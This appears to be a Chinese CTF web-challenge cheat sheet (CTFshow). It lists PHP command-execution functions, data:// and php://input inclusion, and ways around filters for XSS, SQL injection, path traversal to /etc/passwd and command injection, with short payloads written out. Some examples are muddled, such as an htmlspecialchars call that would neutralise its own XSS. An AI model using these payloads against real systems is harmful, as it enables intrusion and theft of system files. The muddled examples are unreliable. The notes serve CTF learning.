# CTFshow-web

## 命令执行

### 执行命令的方法
```
system()

shell_exec()

`

popen
```

## 规避字符

规避空格：  
`%20，%09、$IFS$9、${IFS}`

注意：上面的$需要用反斜杠进行转义

规避其他字符：  
过滤的flag，php，点，可以用通配符*或?代替  

## 文件包含

造成文件包含漏洞的函数通常有：
include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readline
2.data协议
用法：
data://text/plain,xxxx(要执行的php代码)
data://text/plain;base64,xxxx(base64编码后的数据)
3.php://协议
php://input,用于执行php代码，需要post请求提交数据。


1. 绕过字符串过滤
PHP中，字符串过滤通常通过str_replace、preg_replace等函数实现。常见的绕过方法包括：

使用字符编码
例如，过滤掉了script标签，可以通过使用HTML实体来绕过：

```
<?php
echo htmlspecialchars("<scr<script>ipt>alert('XSS');</scr<script>ipt>");
?>
```

利用大小写敏感
有些过滤器对大小写敏感，可以尝试使用混合大小写：

```
<?php
echo "<ScRipT>alert('XSS');</ScRipT>";
?>
```

2. 绕过SQL注入过滤
对于SQL注入，通常的绕过方法包括：

利用注释符
sql
复制代码
SELECT * FROM users WHERE id=1 OR 1=1-- 
利用联合查询
sql
复制代码
SELECT * FROM users WHERE id=1 UNION SELECT 1, 'another_user', 'password';
使用双引号或单引号闭合
sql
复制代码
```
SELECT * FROM users WHERE username='' OR 1=1-- '
```
3. 绕过目录遍历过滤
对于目录遍历，可以尝试：

使用双重URL编码
如果过滤掉了../，可以尝试使用双重URL编码：

bash
复制代码
```
../../etc/passwd -> %252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```
使用长路径
有时候，可以通过长路径来绕过过滤：

bash
复制代码
```
....//....//....//etc/passwd
```
4. 绕过命令注入过滤
对于命令注入，可以尝试：

利用特殊字符
如果过滤掉了|，可以尝试使用换行符：

bash
复制代码
```
`command
another_command`
```
使用反引号
如果过滤掉了&&，可以尝试使用反引号：

bash
复制代码
```
`command1; command2`
```


